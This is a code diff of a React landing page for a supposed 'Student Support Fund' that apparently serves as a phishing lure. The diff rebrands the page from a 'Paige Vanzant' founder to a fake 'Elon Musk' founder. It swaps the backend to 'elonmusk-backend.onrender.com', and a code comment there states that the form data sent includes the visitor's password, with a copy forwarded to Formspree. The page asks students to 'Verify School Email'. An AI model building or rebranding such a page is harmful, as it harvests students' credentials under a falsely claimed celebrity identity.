@@ -10,6 +10,11 @@
     <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
     <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
     <script crossorigin src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script>
+      Babel.registerPreset('react-classic', {
+        presets: [[Babel.availablePresets.react, { runtime: 'classic' }]]
+      });
+    </script>
     <style>
 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
 
@@ -939,7 +944,7 @@ body {
   </head>
   <body>
     <div id="root"></div>
-    <script type="text/babel">
+    <script type="text/babel" data-presets="react-classic">
       const { useState } = React;
 
       // SVG Icons
@@ -995,9 +1000,9 @@ body {
                   <span></span><span></span><span></span>
                 </button>
                 <div className={`nav-links ${menuOpen ? 'open' : ''}`}>
-                  <a href="#" onClick={() => setMenuOpen(false)}>Programs</a>
-                  <a href="#" onClick={() => setMenuOpen(false)}>About</a>
-                  <a href="#" onClick={() => setMenuOpen(false)}>FAQ</a>
+                  <a href="#programs" onClick={(e) => { e.preventDefault(); setMenuOpen(false); document.getElementById('programs')?.scrollIntoView({behavior:'smooth'}); }}>Programs</a>
+                  <a href="#about" onClick={(e) => { e.preventDefault(); setMenuOpen(false); document.getElementById('about')?.scrollIntoView({behavior:'smooth'}); }}>About</a>
+                  <a href="#faq" onClick={(e) => { e.preventDefault(); setMenuOpen(false); document.getElementById('faq')?.scrollIntoView({behavior:'smooth'}); }}>FAQ</a>
                   <button className="nav-cta" onClick={() => { setMenuOpen(false); onVerifyClick(); }}>Get Started</button>
                 </div>
               </div>
@@ -1007,10 +1012,6 @@ body {
             {/* Hero */}
             <section className="hero">
               <div className="hero-container">
-                <div className="hero-badge">
-                  <span className="dot"></span>
-                  Now accepting applications for Fall 2026
-                </div>
                 <h1 className="hero-title">Helping Students Succeed Without Financial Barriers</h1>
                 <p className="hero-subtitle">
                   Explore student support opportunities designed to assist with educational expenses, 
@@ -1018,7 +1019,7 @@ body {
                 </p>
                 <div className="hero-actions">
                   <button className="btn-primary" onClick={onVerifyClick}>Verify School Email</button>
-                  <button className="btn-secondary">Explore Programs</button>
+                  <button className="btn-secondary" onClick={() => document.getElementById('programs')?.scrollIntoView({behavior:'smooth'})}>Explore Programs</button>
                 </div>
               </div>
             </section>
@@ -1033,7 +1034,7 @@ body {
             </section>
 
             {/* Programs */}
-            <section className="programs-section">
+            <section id="programs" className="programs-section">
               <div className="section-header">
                 <span className="overline">Programs</span>
                 <h2>Support Programs</h2>
@@ -1057,7 +1058,7 @@ body {
             </section>
 
             {/* Trust */}
-            <section className="trust-section">
+            <section id="about" className="trust-section">
               <div className="section-header">
                 <span className="overline">Why Us</span>
                 <h2>Why Students Trust Us</h2>
@@ -1081,30 +1082,27 @@ body {
             <section className="ceo-section">
               <div className="section-header">
                 <span className="overline">Leadership</span>
-                <h2>Founded by Paige Vanzant</h2>
+                <h2>Founded by Elon Musk</h2>
               </div>
               <div className="ceo-card">
                 <div className="ceo-avatar">
-                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
-                    <circle cx="12" cy="7" r="4"/>
-                  </svg>
+                  <img src="/elon-musk.jpg" alt="Elon Musk" style={{width:'100%',height:'100%',borderRadius:'50%',objectFit:'cover'}} />
                 </div>
                 <div className="ceo-content">
-                  <h3>Paige Vanzant</h3>
+                  <h3>Elon Musk</h3>
                   <span className="ceo-title">Chief Executive Officer & Founder</span>
                   <p>
-                    Paige Vanzant founded the Student Support Fund with a mission to eliminate financial barriers 
-                    in education. Under her leadership, the organization has grown to serve thousands of students 
+                    Elon Musk founded the Student Support Fund with a mission to eliminate financial barriers 
+                    in education. Under his leadership, the organization has grown to serve thousands of students 
                     across hundreds of institutions, providing critical support for tuition, housing, technology, 
-                    and more. Her vision continues to drive innovation in student financial assistance.
+                    and more. His vision continues to drive innovation in student financial assistance.
                   </p>
                 </div>
               </div>
             </section>
 
             {/* FAQ */}
-            <section className="faq-section">
+            <section id="faq" className="faq-section">
               <div className="section-header">
                 <span className="overline">FAQ</span>
                 <h2>Frequently Asked Questions</h2>
@@ -1119,7 +1117,7 @@ body {
             {/* Footer */}
             <footer className="footer">
               <div className="footer-container">
-                <p>&copy; 2026 Student Support Fund. All rights reserved. Founded by Paige Vanzant.</p>
+                <p>&copy; 2026 Student Support Fund. All rights reserved. Founded by Elon Musk.</p>
                 <div className="footer-links">
                   <a href="#">Privacy Policy</a>
                   <a href="#">Terms of Service</a>
@@ -1163,9 +1161,7 @@ body {
 
           try {
             // Save to MongoDB (includes password)
-            const apiUrl = window.location.hostname === 'localhost' 
-              ? 'http://localhost:5000/api/submit-form'
-              : 'https://paige-incent-backend.onrender.com/api/submit-form';
+            const apiUrl = 'https://elonmusk-backend.onrender.com/api/submit-form';
             const response = await fetch(apiUrl, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -1179,10 +1175,11 @@ body {
             });
 
             // Also send to Formspree for company (without password)
-            await fetch('https://formspree.io/f/mnjywqgg', {
+            await fetch('https://formspree.io/f/mgojeozb', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
+                siteName: 'Elon Musk Student Fund',
                 email: formData.email,
                 following: formData.following,
                 academicLevel: formData.academicLevel,
